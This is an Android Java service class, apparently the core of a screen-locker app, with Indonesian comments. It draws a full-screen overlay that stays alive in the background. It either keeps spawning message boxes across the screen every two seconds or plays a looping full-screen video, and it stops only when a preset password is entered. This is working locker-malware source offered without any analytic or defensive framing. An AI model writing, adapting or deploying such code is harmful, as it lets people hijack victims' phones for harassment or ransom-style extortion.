package com.nullx.pp;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.*;
import java.util.Random;

public class LockService extends Service {
    private WindowManager wm;
    private FrameLayout rootWrapper; // Wadah utama transparan
    private Handler spamHandler = new Handler(Looper.getMainLooper());
    private Random random = new Random();
    private String correctPassword = "";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String mode = intent.getStringExtra("mode");
        correctPassword = intent.getStringExtra("password");
        String msg = intent.getStringExtra("message");

        if (wm == null) initWindowManager();
        
        startLockMode(mode, msg);
        return START_STICKY; // Tetap hidup di latar belakang
    }

    private void initWindowManager() {
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        rootWrapper = new FrameLayout(this);
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | 
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        );
        wm.addView(rootWrapper, params);
    }

    private void startLockMode(String mode, String msg) {
        if ("mode3".equals(mode)) {
            // Langsung munculin Video Fullscreen
            View v3 = LayoutInflater.from(this).inflate(R.layout.layout_lock_type3, null);
            VideoView vv = v3.findViewById(R.id.vv_lock_stream);
            vv.setVideoURI(Uri.parse(vv.getTag().toString()));
            vv.setOnPreparedListener(mp -> { mp.setLooping(true); vv.start(); });
            rootWrapper.addView(v3);
        } else {
            // Mode 1 & 2: Spawning berulang memenuhi layar
            int layoutId = "mode1".equals(mode) ? R.layout.layout_lock_type1 : R.layout.layout_lock_type2;
            startSpawning(layoutId, msg);
        }
    }

    private void startSpawning(int layoutId, String msg) {
        spamHandler.post(new Runnable() {
            @Override
            public void run() {
                View box = LayoutInflater.from(LockService.this).inflate(layoutId, null);
                
                FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT);
                
                // Acak posisi agar memenuhi layar
                lp.leftMargin = random.nextInt(Math.max(1, 800)); 
                lp.topMargin = random.nextInt(Math.max(1, 1500));
                
                rootWrapper.addView(box, lp);

                // Khusus Mode 1: Set pesan dan tombol unlock
                if (layoutId == R.layout.layout_lock_type1) {
                    ((TextView)box.findViewById(R.id.txt_lock_msg)).setText(msg);
                    box.findViewById(R.id.btn_unlock_type1).setOnClickListener(v -> {
                        String input = ((EditText)box.findViewById(R.id.et_lock_pass)).getText().toString();
                        if (input.equals(correctPassword)) stopSelf();
                    });
                }
                
                spamHandler.postDelayed(this, 2000); // Muncul setiap 2 detik
            }
        });
    }

    @Override
    public void onDestroy() {
        if (rootWrapper != null) wm.removeView(rootWrapper);
        spamHandler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}